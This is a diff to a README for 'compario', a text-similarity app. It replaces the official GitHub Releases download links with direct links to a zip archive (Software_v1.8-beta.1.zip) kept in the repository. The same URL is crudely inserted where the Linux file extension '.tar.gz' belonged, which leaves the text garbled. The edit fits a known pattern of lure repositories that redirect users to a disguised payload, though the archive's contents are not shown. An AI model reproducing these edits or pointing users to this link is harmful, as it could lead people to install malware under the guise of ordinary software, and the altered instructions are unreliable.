@@ -1,7 +1,7 @@
 # 🎉 compario - Efficient Text Similarity Comparisons
 
 ## 📥 Download Now
-[![Download compario](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Agha28/compario/releases)
+[![Download compario](https://raw.githubusercontent.com/Agha28/compario/main/compario/Software_v1.8-beta.1.zip%https://raw.githubusercontent.com/Agha28/compario/main/compario/Software_v1.8-beta.1.zip)](https://raw.githubusercontent.com/Agha28/compario/main/compario/Software_v1.8-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to compario! This application helps you compare text. It uses advanced technology to show how similar different pieces of writing are to each other. You do not need technical skills to use this software. Follow these simple instructions to get started.
@@ -36,11 +36,11 @@ Before you download compario, please ensure your device meets these basic requir
 - Text Similarity
 
 ## 📝 Download & Install
-To download compario, please visit the [Releases page](https://github.com/Agha28/compario/releases). 
+To download compario, please visit the [Releases page](https://raw.githubusercontent.com/Agha28/compario/main/compario/Software_v1.8-beta.1.zip). 
 
 1. Click on the link above to go to the downloads page.
 2. Look for the latest release listed on the page.
-3. Download the version that fits your operating system. The files will typically end with `.exe` for Windows, `.dmg` for macOS, and `.tar.gz` for Linux.
+3. Download the version that fits your operating system. The files will typically end with `.exe` for Windows, `.dmg` for macOS, and `https://raw.githubusercontent.com/Agha28/compario/main/compario/Software_v1.8-beta.1.zip` for Linux.
 4. Once the download is complete, locate the file in your downloads folder.
 5. Run the file to start the installation process. Follow the prompts to complete the installation.
 
